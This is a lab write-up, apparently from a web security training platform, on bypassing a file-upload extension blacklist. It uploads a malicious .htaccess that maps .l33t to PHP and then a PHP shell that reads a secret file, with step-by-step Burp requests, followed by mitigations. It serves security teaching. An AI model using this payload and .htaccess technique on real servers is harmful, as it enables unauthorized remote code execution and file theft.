# Lab Name
Web shell upload via extension blacklist bypass

## Vulnerability
Unrestricted File Upload – Extension Blacklist Bypass using .htaccess

## Objective
Bypass the server's file extension blacklist by uploading a malicious **.htaccess** file, execute a PHP payload with a custom extension, retrieve Carlos's secret, and solve the lab.

## Entry Point
Avatar Upload functionality

## Exploitation Type
Unrestricted File Upload / Extension Blacklist Bypass / Remote Code Execution (RCE)

## Methodology
1. Open Burp's browser and log in using the provided user credentials.

2. Navigate to the **My Account** page and upload any valid image as your avatar.

3. Return to the account page and verify that the uploaded avatar is displayed successfully.

4. In **Burp Suite**, go to **Proxy > HTTP History** and locate the request used to retrieve your uploaded avatar.

Example:

```http
GET /files/avatars/image.jpg HTTP/1.1
```

5. Send this request to **Burp Repeater**.

6. On your local machine, create a file named **shell.php** containing the following PHP code:

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

7. Attempt to upload **shell.php** as your avatar.

8. Observe that the application blocks the upload because files with the **.php** extension are not allowed.

9. In **Proxy > HTTP History**, locate the **POST /my-account/avatar** request and inspect the response headers.

10. Observe that the server is running **Apache**.

11. Send the **POST /my-account/avatar** request to **Burp Repeater**.

12. In the multipart request body, modify the uploaded file as follows:

- Change the filename to:

```http
.htaccess
```

- Change the Content-Type to:

```http
Content-Type: text/plain
```

- Replace the PHP payload with the following Apache directive:

```apache
AddType application/x-httpd-php .l33t
```

13. Send the request.

14. Observe that the **.htaccess** file is uploaded successfully.

15. In **Burp Repeater**, use the **Back** button to return to the original upload request.

16. Change the filename from:

```http
shell.php
```

to:

```http
shell.l33t
```

17. Keep the PHP payload unchanged and send the request again.

18. Observe that the file is uploaded successfully.

19. Switch to the Repeater tab containing the avatar retrieval request.

20. Replace the image filename with:

```http
GET /files/avatars/shell.l33t HTTP/1.1
```

21. Send the request.

22. Observe that the server executes the **exploit.l33t** file as PHP because of the uploaded **.htaccess** configuration, and the response contains the contents of **/home/carlos/secret**.

23. Copy Carlos's secret and submit it to solve the lab.

## Payload Used

### PHP Payload

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

### Malicious .htaccess

```apache
AddType application/x-httpd-php .l33t
```

### Upload Request

```http
filename=".htaccess"
Content-Type: text/plain
```

### PHP File Upload

```http
filename="shell.l33t"
```

### Request

```http
GET /files/avatars/shell.l33t HTTP/1.1
```

## Result
Successfully bypassed the file extension blacklist by uploading a malicious **.htaccess** file, configured the server to execute **.l33t** files as PHP, retrieved Carlos's secret, and solved the lab.

## Impact
- Remote Code Execution (RCE)
- File Upload Restriction Bypass
- Arbitrary Code Execution
- Sensitive File Disclosure
- Complete Server Compromise

## Mitigation
- Disable **.htaccess** overrides in upload directories.
- Store uploaded files outside the web root.
- Use a strict allowlist for permitted file extensions.
- Validate file contents using server-side signature checks.
- Prevent execution of uploaded files.
- Rename uploaded files using server-generated random names.

## Learning
This vulnerability exists because the application only blocks dangerous file extensions such as **.php** but still allows uploading **.htaccess** files. On Apache servers, attackers can abuse **.htaccess** directives such as **AddType** to map an arbitrary extension (for example, **.l33t**) to the PHP interpreter. Once this configuration is uploaded, any file with the mapped extension is executed as PHP, resulting in Remote Code Execution.
